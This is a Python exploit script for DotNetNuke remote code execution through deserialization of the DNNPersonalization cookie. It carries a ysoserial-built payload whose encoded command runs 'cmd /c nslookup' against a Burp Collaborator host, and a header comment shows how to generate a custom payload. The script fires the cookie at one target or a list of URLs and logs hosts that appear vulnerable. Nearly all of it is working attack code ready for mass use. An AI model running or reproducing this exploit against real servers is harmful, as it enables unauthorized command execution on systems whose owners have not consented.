#!/usr/bin/env python
#
# DNN RCE - Preset Burp Collab so requires you to run your own yso
# ysoserial.exe -p DotNetNuke -m run_command -c "nslookup l8uxxrd9kgpyhc3zb7nwqexmldr3fs.burpcollaborator.net"
# 
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False,help="URL of host to check will need http or https")
parser.add_argument("-f", "--file",required=False, help="File of URLS to check")


args = parser.parse_args()
files = args.file
url = args.url

def test_page(newurl):
	print ("[+] Testing "+newurl+" [+]")
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36","Connection":"close","Accept":"*/*"}
	cookies = {"DNNPersonalization":"<profile><item key=\"key\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type=\"ObjectStateFormatter\" xmlns:p3=\"http://www.w3.org/2001/XMLSchema-instance\" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1=\"http://www.w3.org/2001/XMLSchema\" p5:type=\"q1:string\" xmlns:p5=\"http://www.w3.org/2001/XMLSchema-instance\">/wEyyAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADqBTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBuc2xvb2t1cCBmeGdybWwyMzlhZXM2NnN0MDFjcWY4bWdhN2d5NG4uYnVycGNvbGxhYm9yYXRvci5uZXQiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>"}
	response = session.get(""+newurl+"404", headers=headers, cookies=cookies,timeout=10)
	if 'content-length' in response.headers:
		if (response.status_code == 404 and int(response.headers["content-length"]) > 1600 and '404 Error Page' in response.text or 'DNN Corporation' in response.text):
			print ("[*] DNN Looks to be Vun! - "+response.headers["Content-Length"]+"")
			text_file = open("vun.txt", "a")
			text_file.write("URL: %s\n" % newurl)
			text_file.close()
		else:
			print ("[-] Sorry Not Vuln - "+response.headers["Content-Length"]+"[-]")
	elif (response.status_code == 404 and '404 Error Page' in response.text or 'DNN Corporation' in response.text):
		print ("[*] DNN Looks to be Vun! - No Content-Length Returned Manaul Check Advised.")
		text_file = open("man.txt", "a")
		text_file.write("URL: %s\n" % newurl)
		text_file.close()
	else:
			print ("[-] Sorry Not Vuln [-]")		
	time.sleep(8)







if files:
	if os.path.exists(files):
		with open(files, 'r') as f:
			for line in f:
				newurl = line.replace("\n","")
				try:
					test_page(newurl)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
				
elif url:
	test_page(url)
	
else:
	print("[-] No Options Set [-]")
